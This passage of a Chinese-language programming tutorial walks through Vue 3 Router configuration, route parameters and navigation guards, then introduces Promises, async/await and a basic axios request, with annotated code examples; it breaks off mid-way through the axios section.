<h4 id="2、改写main-js，使用路由"><a href="#2、改写main-js，使用路由" class="headerlink" title="2、改写main.js，使用路由"></a>2、改写main.js，使用路由</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="comment">// 在整个App.vue中可以使用路由</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./routers/router.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app=<span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"><span class="comment">// 使用路由</span></span><br><span class="line">app.<span class="title function_">use</span>(router)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h4 id="3、App-vue设置切换"><a href="#3、App-vue设置切换" class="headerlink" title="3、App.vue设置切换"></a>3、App.vue设置切换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;App.vue，不是router-view，不会被替换&lt;/h1&gt;</span><br><span class="line">    &lt;!-- 暂时无法使用&lt;a&gt; 标签，url /#/ 会变成 /home#/ 而不是 /#/home,</span><br><span class="line">         需要router-link，此标签改变浏览器输入（访问）的url</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;router-link to=&quot;/update&quot;&gt;update页&lt;/router-link&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">      &lt;!-- router-view标签会被替换为具体的.vue的内容</span><br><span class="line">            在此APP.vue中也只有router-view标签会被替换，其他不变</span><br><span class="line">      --&gt;</span><br><span class="line">      &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h1&gt;App.vue，不是router-view，不会被替换&lt;/h1&gt;</span><br><span class="line">  &lt;/div&gt;   </span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<h3 id="重定向和其他细节"><a href="#重定向和其他细节" class="headerlink" title="重定向和其他细节"></a>重定向和其他细节</h3><p><strong>重定向的实现：</strong>在路由指导文件router.js中的<code>routers</code>属性下添加新的路径即可：如图，路径<code>/</code>被重定向到了<code>/home</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&quot;/&quot;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&quot;/home&quot;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">        &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p><strong>指定组件展示：</strong>一般不指定，一个.vue中只使用一个router-view标签</p>
<ul>
<li>一个视图上可以同时存在多个 router-view 标签</li>
<li><em>每个router-view 都可以设置专门用于展示哪个组件</em> </li>
<li><em>设置 <code>name 属性</code>，并在路由指定文件的 routes属性中指明</em></li>
<li><em>但此后没有设置name属性的router-view将无法展示，还需要在路由指定文件的 routes属性中指明<code>default</code></em></li>
</ul>
<p>示例App.vue</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;!-- 一个视图上可以同时存在多个 router-view 标签</span><br><span class="line">        每个router-view 都可以设置专门用于展示哪个组件 </span><br><span class="line">        设置 name 属性，并在路由指定文件的 routes属性中指明</span><br><span class="line">        但此后没有设置name属性的router-view将无法展示，还需要在路由指定文件的 routes属性中指明default</span><br><span class="line">  --&gt;  </span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;router-link to=&quot;/update&quot;&gt;Update&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">      &lt;router-link to=&quot;/home&quot;&gt;Home&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">      &lt;router-link to=&quot;/add&quot;&gt;Add&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">      &lt;router-link to=&quot;/list&quot;&gt;List&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">      &lt;hr&gt;</span><br><span class="line">      &lt;router-view name=&quot;homeView&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">      &lt;hr&gt;</span><br><span class="line">      &lt;router-view name=&quot;listView&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">      &lt;hr&gt;</span><br><span class="line">      &lt;router-view name=&quot;updateView&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">      &lt;hr&gt;</span><br><span class="line">      &lt;router-view name=&quot;addView&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">      &lt;hr&gt;</span><br><span class="line">      &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>示例router.js：<em><strong>注意：有了name属性后，需要使用 components 而不是component</strong></em></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&quot;/&quot;</span>,</span><br><span class="line">        <span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&quot;/home&quot;</span>,</span><br><span class="line">        <span class="attr">components</span>:&#123;</span><br><span class="line">            <span class="attr">default</span>:<span class="title class_">Home</span>,</span><br><span class="line">        <span class="comment">// 当url为/home时没有name属性的router-view默认展示home组件</span></span><br><span class="line">        <span class="comment">// 仅对 url 为 /home 生效，其他url也需要单独设置自己的default 否则不展示没有name属性的router-view</span></span><br><span class="line">            <span class="attr">homeView</span>:<span class="title class_">Home</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&quot;/list&quot;</span>,</span><br><span class="line">        <span class="attr">components</span>:&#123;<span class="attr">listView</span>:<span class="title class_">List</span>&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&quot;/add&quot;</span>,</span><br><span class="line">        <span class="attr">components</span>:&#123;<span class="attr">addView</span>:<span class="title class_">Add</span>&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&quot;/update&quot;</span>,</span><br><span class="line">        <span class="attr">components</span>:&#123;</span><br><span class="line">            <span class="attr">updateView</span>:<span class="title class_">Update</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="编程式路由"><a href="#编程式路由" class="headerlink" title="编程式路由"></a>编程式路由</h3><p>使用<code>useRouter()</code>获取路由对象，<code>路由对象.push(path)</code>引出路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">  import &#123; ref &#125; from &#x27;vue&#x27;;</span><br><span class="line">  import &#123; useRouter &#125; from &#x27;vue-router&#x27;;</span><br><span class="line">  const router = useRouter()   // 这就是router.js中的router对象，只是通过useRouter()获取</span><br><span class="line">  let myPath = ref(&quot;&quot;)</span><br><span class="line">  function showView()&#123;</span><br><span class="line">    // 编程式路由实现页面跳转</span><br><span class="line">    router.push(myPath.value)</span><br><span class="line">    // 或</span><br><span class="line">    // router.push(&#123;path:myPath&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 声明式路由：路径是规定的 --&gt;</span><br><span class="line">    &lt;router-link to=&quot;/update&quot;&gt;Update&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">    &lt;router-link to=&quot;/home&quot;&gt;Home&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">    &lt;router-link to=&quot;/add&quot;&gt;Add&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">    &lt;router-link to=&quot;/list&quot;&gt;List&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!-- 编程式路由： --&gt;</span><br><span class="line">      &lt;button @click=&quot;showView()&quot;&gt;Go&lt;/button&gt;&lt;input type=&quot;text&quot; v-model=&quot;myPath&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="路由传参"><a href="#路由传参" class="headerlink" title="路由传参"></a>路由传参</h3><h4 id="路径传参"><a href="#路径传参" class="headerlink" title="路径传参"></a>路径传参</h4><p>对于声明式路由，按正常方式，路径带参数；对于编程式路由，函数形参承接传递的参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; useRouter &#125; from &#x27;vue-router&#x27;;</span><br><span class="line"></span><br><span class="line">const router = useRouter()</span><br><span class="line">function ShowDetails(id,language)&#123;</span><br><span class="line">  router.push(`/showDetail/$&#123;id&#125;/$&#123;language&#125;`)</span><br><span class="line">  // 或： router.push(&#123;path:`/showDetail/$&#123;id&#125;/$&#123;language&#125;`&#125;)</span><br><span class="line">&#125; </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 声明式路由路径传参：参数是 1 和 java</span><br><span class="line">         在router.js文件的routes标签下对path做特殊处理</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;router-link to=&quot;/showDetail/1/java&quot;&gt;声明式路由路径传参&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">    &lt;button @click=&quot;ShowDetails(2,&#x27;PHP&#x27;)&quot;&gt;编程式路由传参&lt;/button&gt;  &lt;br&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>修改router.js，使用占位符表示路径参数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 路径传参，id 和 language就是自定义占位参数名了</span></span><br><span class="line">            <span class="attr">path</span>:<span class="string">&quot;/showDetail/:id/:language&quot;</span>,</span><br><span class="line">            <span class="attr">component</span>:showDetail</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure>

<p>接收参数，使用<code>useRoute()函数</code>，<code>.params.参数名</code>表示参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"></span><br><span class="line">import &#123; onUpdated, ref &#125; from &#x27;vue&#x27;;</span><br><span class="line">import &#123; useRoute &#125; from &#x27;vue-router&#x27;;</span><br><span class="line">/* 接收路径传参 </span><br><span class="line">   useRoute()函数接收路径参数</span><br><span class="line">   .params 表示路径参数</span><br><span class="line">*/</span><br><span class="line">let route = useRoute()</span><br><span class="line">// 接收参数，id即为在router中自定义的占位参数名</span><br><span class="line">let  languageId = ref(0)</span><br><span class="line">let  languageName = ref(&quot;&quot;)</span><br><span class="line">languageId.value = route.query.id</span><br><span class="line">languageName.value = route.query.language</span><br><span class="line">onUpdated(()=&gt;&#123;</span><br><span class="line">    // 当数据更新完毕后参数也更新</span><br><span class="line">    // 如果没有在onUpdate()函数中书写，会只执行一次，传递参数更新不更新实参</span><br><span class="line">    languageId.value = route.params.id</span><br><span class="line">    languageName.value = route.params.language</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;&#123;&#123; languageId &#125;&#125;&#123;&#123;languageName&#125;&#125;是世界上最好的编程语言&lt;/h1&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<h4 id="键值对传参"><a href="#键值对传参" class="headerlink" title="键值对传参"></a>键值对传参</h4><p>传递参数：声明式改变url；编程式修改函数体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"></span><br><span class="line">import &#123; useRouter &#125; from &#x27;vue-router&#x27;;</span><br><span class="line"></span><br><span class="line">const router = useRouter()</span><br><span class="line">function ShowDetails(pId,pLanguage)&#123;</span><br><span class="line">  router.push(`/showDetail?id=$&#123;pId&#125;&amp;language=$&#123;pLanguage&#125;`)</span><br><span class="line">  // 或：</span><br><span class="line">  // router.push(&#123;path:&#x27;/showDetail&#x27;,query:&#123;id:pId,language:pLanguage&#125;&#125;) </span><br><span class="line">&#125; </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 键值对传参 --&gt;</span><br><span class="line">    &lt;router-link to=&quot;/showDetail?id=1&amp;language=java&quot;&gt;声明式路由键值对传参&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">    &lt;!-- 也可写成：</span><br><span class="line">    &lt;router-link v-bind:to=&quot;&#123;path:&#x27;/showDetail&#x27;,query:&#123;id:2,language:&#x27;java&#x27;&#125;&#125;&quot;&gt;声明式路由键值对传参&lt;/router-link&gt; &lt;br&gt;</span><br><span class="line">    --&gt;    </span><br><span class="line">    &lt;button @click=&quot;ShowDetails(3,&#x27;PHP&#x27;)&quot;&gt;编程式键值对传参&lt;/button&gt;  &lt;br&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>路由指定：无需特别指定</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&quot;/showDetail&quot;</span>,</span><br><span class="line">        <span class="attr">component</span>:showDetail</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<p>接收参数：<code>.query.参数名</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"></span><br><span class="line">import &#123; onUpdated, ref &#125; from &#x27;vue&#x27;;</span><br><span class="line">import &#123; useRoute &#125; from &#x27;vue-router&#x27;;</span><br><span class="line">/* 接收键值对传参 </span><br><span class="line">   useRoute()函数接收路径参数</span><br><span class="line">   .query  表示键值对参数</span><br><span class="line">*/</span><br><span class="line">let route = useRoute()</span><br><span class="line">// 接收参数，.query. 后的参数名必须与url中的参数名一致</span><br><span class="line">let  languageId = ref(0)</span><br><span class="line">let  languageName = ref(&quot;&quot;)</span><br><span class="line">languageId.value = route.query.id</span><br><span class="line">languageName.value = route.query.language</span><br><span class="line">onUpdated(()=&gt;&#123;</span><br><span class="line">    languageId.value = route.query.id</span><br><span class="line">    languageName.value = route.query.language</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="路由守卫"><a href="#路由守卫" class="headerlink" title="路由守卫"></a>路由守卫</h3><p>Vue Router 提供了路由守卫（Navigation Guards）机制，允许你在导航过程中执行一些逻辑，例如权限验证、页面加载前的数据预取等。路由守卫可以帮助你控制导航行为，确保用户只能访问他们有权限的页面。</p>
<p>路由守卫的类型</p>
<p>Vue Router 提供了三种类型的路由守卫：</p>
<ol>
<li><strong>全局前置守卫（Global Before Guards）</strong>：全局前置守卫在每次路由切换之前都会被调用。</li>
<li><strong>路由独享守卫（Per-Route Guards）</strong>：可以在定义路由时为每个路由单独添加守卫。这些守卫只会在进入该特定路由时触发。</li>
<li><strong>组件内守卫（In-Component Guards）</strong>：可以在组件内部定义导航守卫。这些守卫只会影响包含它们的组件。</li>
</ol>
<p>除了上述三种主要类型的守卫，Vue Router 还提供了其他几种辅助性的守卫和钩子</p>
<ul>
<li><p><strong>全局解析守卫</strong>：在导航被确认之前处理异步操作。</p>
</li>
<li><p><strong>后置钩子</strong>：在导航完成后执行的操作</p>
</li>
</ul>
<p>使用示例：</p>
<p>在router.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// router在哪个文件创建就需要在哪个文件设置全局路由守卫</span></span><br><span class="line"><span class="comment">// 全局前置守卫：每次路由切换页面 前都会执行beforeEach中的回调函数</span></span><br><span class="line">router.<span class="title function_">beforeEach</span>(</span><br><span class="line">    <span class="comment">/* 回调函数常设置3个参数</span></span><br><span class="line"><span class="comment">       from: 上一个页面</span></span><br><span class="line"><span class="comment">       to:   下一个页面</span></span><br><span class="line"><span class="comment">       next: 放行的方法，只有执行了该方法才会放行路由   </span></span><br><span class="line"><span class="comment">        next()  放行</span></span><br><span class="line"><span class="comment">        next(&quot;/路径&quot;) 路由重定向，必须在if条件下执行，避免死循环</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`beforeEach:from <span class="subst">$&#123;<span class="keyword">from</span>.path&#125;</span> to <span class="subst">$&#123;to.path&#125;</span>`</span>);    </span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局后置守卫：每次路由切换页面 后都会执行afterEach中的回调函数</span></span><br><span class="line">router.<span class="title function_">afterEach</span>(<span class="function">(<span class="params">to,<span class="keyword">from</span></span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`afterEach:from <span class="subst">$&#123;<span class="keyword">from</span>.path&#125;</span> to <span class="subst">$&#123;to.path&#125;</span>`</span>);    </span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向外暴露router</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>





<hr>
<h2 id="Vue3数据交互-axios"><a href="#Vue3数据交互-axios" class="headerlink" title="Vue3数据交互 axios"></a>Vue3数据交互 axios</h2><h3 id="Promise简介"><a href="#Promise简介" class="headerlink" title="Promise简介"></a>Promise简介</h3><p><strong>回调函数：</strong></p>
<p>回调函数（Callback Function）是 JavaScript 中处理异步操作和事件驱动编程的一种常见模式。回调函数是一个作为参数传递给另一个函数的函数，并在某个特定事件或条件发生时被调用。回调函数通常用于处理异步操作、事件监听等场景。在 JavaScript 中，许多异步操作（如网络请求、文件读取、定时器等）都使用回调函数来处理操作完成后的逻辑。</p>
<p>示例：定时器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">深色版本</span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">  console.log(&#x27;This message will be logged after 2 seconds&#x27;);</span><br><span class="line">&#125;, 2000);</span><br></pre></td></tr></table></figure>

<p>这里 <code>setTimeout</code> 是一个内置的异步函数，它接受两个参数：一个回调函数和一个延迟时间（毫秒）。回调函数将在指定的延迟时间后执行。</p>
<p>当多个异步操作需要按顺序执行时，可能会出现嵌套的回调函数，这种现象被称为“回调地狱”。回调地狱不仅使得代码难以阅读和维护，还容易引发错误。为了解决回调地狱问题，JavaScript 提供了多种解决方案，包括 Promise、async&#x2F;await 等。</p>
<p><strong>Promise</strong> 是一种用于处理异步操作的对象。它表示一个异步操作的最终完成（或失败）及其结果值。Promise 提供了一种更清晰的方式来处理异步代码，避免了回调地狱（Callback Hell）的问题。</p>
<p>**Promise 的状态: **</p>
<p>一个 Promise 对象代表一个异步操作，有三种状态：</p>
<ol>
<li><strong>Pending（进行中）</strong>：初始状态，既不是成功，也不是失败。</li>
<li><strong>Fulfilled（已成功）</strong>：操作成功完成。</li>
<li><strong>Rejected（已失败）</strong>：操作失败。</li>
</ol>
<p>只有异步操作的结果可以决定当前是哪一种状态，任何其他操作都无法改变整个状态，一旦 Promise 被解决（fulfilled 或 rejected），它的状态就不可再改变，并且结果值也会被固定下来，此后任何时候都可以得到这个结果。</p>
<h3 id="promise基本语法"><a href="#promise基本语法" class="headerlink" title="promise基本语法"></a>promise基本语法</h3><p>使用示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  内部函数有两个参数，均为函数，可以自定义名称，但一般不要</span></span><br><span class="line"><span class="comment">    resolve函数 在回调函数中如果调用resolve函数，promise 由 pending 转为 resolved</span></span><br><span class="line"><span class="comment">    reject函数 在回调函数中如果调用 reject 函数，promise 由 pending 转为 reject</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve,reject</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;promise的函数内部代码&quot;</span>)</span><br><span class="line">    <span class="comment">// resolve / reject可以带参也可以不带参数</span></span><br><span class="line">    <span class="comment">// 内部设置条件判断等，按业务需求决定resolve还是reject</span></span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&quot;hahaha&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 其他代码不会等待 promise 的状态发生改变才执行</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;其他代码，不等promise状态发生改变&quot;</span>);</span><br><span class="line"><span class="comment">/* promise.then() </span></span><br><span class="line"><span class="comment">    返回一个promise对象，可以接收以作进一步处理，也可以不用promise1接返回值，直接promise.then().catch()</span></span><br><span class="line"><span class="comment">    内部的代码需要promise的状态发生改变才会执行</span></span><br><span class="line"><span class="comment">    以两个函数作为参数，前者是promise转为resolve状态时执行；后者是promise转为reject状态会执行</span></span><br><span class="line"><span class="comment">    作为参数的函数可以没有形参，取决于上面的resolve/reject是否带参数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> promise1 = promise.<span class="title function_">then</span>(</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">// pending =&gt; resolve 时执行</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;promise success:&quot;</span>+data);        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当有了promise1.catch，此部分可以省略，因为 reject 时可以直接交给 catch 处理</span></span><br><span class="line">    <span class="comment">// ,</span></span><br><span class="line">    <span class="comment">// function()&#123;</span></span><br><span class="line">    <span class="comment">//      // pending =&gt; reject 时执行</span></span><br><span class="line">    <span class="comment">//     console.log(&quot;promise fail&quot;);        </span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 进一步处理 </span></span><br><span class="line">promise1.<span class="title function_">catch</span>(</span><br><span class="line">    <span class="comment">// 函数可以直接接收reject的参数</span></span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 当promise状态为reject或出现异常时，执行此函数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;promise fail or exception&quot;</span>);      </span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;其他代码，不等promise状态发生改变&quot;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="promise关键字-async和await的使用"><a href="#promise关键字-async和await的使用" class="headerlink" title="promise关键字 async和await的使用"></a>promise关键字 async和await的使用</h3><p>使用说明：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">async关键字 帮助我们使用简洁语法获得一个promise对象</span></span><br><span class="line"><span class="comment">    原写法：let promise = new Promise(function()&#123;&#125;</span></span><br><span class="line"><span class="comment">    1. 使用关键字 async 标识函数，此函数返回的结果就是一个promise对象</span></span><br><span class="line"><span class="comment">    2. 被标识函数如果正常return结果，promise状态就是resolve，return的结果即上文中resolve(参数) 的参数</span></span><br><span class="line"><span class="comment">    3. 被标识函数如果出现异常，则返回的promise状态就是reject.</span></span><br><span class="line"><span class="comment">    4. 被标识函数如果return一个 promise，则返回的promise状态由内部的promise状态决定.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">proFunc</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span></span><br><span class="line">    <span class="comment">// return Promise.resolve(&quot;haha&quot;)</span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">// async 声明的函数还是需要调用的！！ </span></span><br><span class="line"><span class="title function_">proFunc</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// result 即为 10</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;success:&quot;</span>+result);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fail:&quot;</span>+err);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">await关键字 帮助我们获取promise成功状态的返回值的关键字</span></span><br><span class="line"><span class="comment">    1. 如果修饰的是一个普通值，则直接返回该值；</span></span><br><span class="line"><span class="comment">    2. 如果修饰的是一个成功状态的promise，返回promise成功状态的结果</span></span><br><span class="line"><span class="comment">    3. 如果修饰的是一个失败状态的promise，直接抛出异常</span></span><br><span class="line"><span class="comment">    4. await必须在async修饰的函数中使用，但async修饰的函数中可以没有await</span></span><br><span class="line"><span class="comment">    5. await后的代码需要等待await执行完毕才能继续执行（针对同一函数中的后续代码）</span></span><br><span class="line"><span class="comment">       由此关键字可以不用使用 then() 函数即可获取成功状态返回值</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">proFunc1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="keyword">await</span> <span class="title function_">proFunc1</span>()</span><br><span class="line">    <span class="comment">// 本fun函数中 await 关键字后的代码需要等待 await 执行完成才能执行</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;await got:&quot;</span>+res);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fun</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fun函数外的代码不会等待await&quot;</span>);  </span><br></pre></td></tr></table></figure>



<h3 id="Axios的基本使用"><a href="#Axios的基本使用" class="headerlink" title="Axios的基本使用"></a>Axios的基本使用</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// axios作为整体统一暴露，不使用&#123;&#125;</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getLoveMessage</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 使用axios发送请求</span></span><br><span class="line">  <span class="comment">// axios&#123;&#123;设置请求的参数&#125;&#125; 请求三要素：请求的url 请求方式 请求参数(k-v型、json型)</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 发送请求部分</span></span><br><span class="line">  <span class="keyword">let</span> promise = <span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&quot;get&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;https://api.uomg.com/api/rand.qinghua&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">      <span class="comment">// 当请求方式为 post 时，这里的数据会以JSON形式放入请求体</span></span><br><span class="line">      <span class="comment">// 当请求方式为 get 时，这里的数据会直接被忽略</span></span><br><span class="line">      <span class="attr">username</span>:<span class="string">&quot;lihua&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">params</span>:&#123;</span><br><span class="line">      <span class="comment">// 这里的数据均以键值对方式放在url后</span></span><br><span class="line">      <span class="attr">format</span>:<span class="string">&#x27;json&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 接收结果部分</span></span><br><span class="line">  promise.<span class="title function_">then</span>(&#123;</span><br><span class="line">    <span class="keyword">function</span>(<span 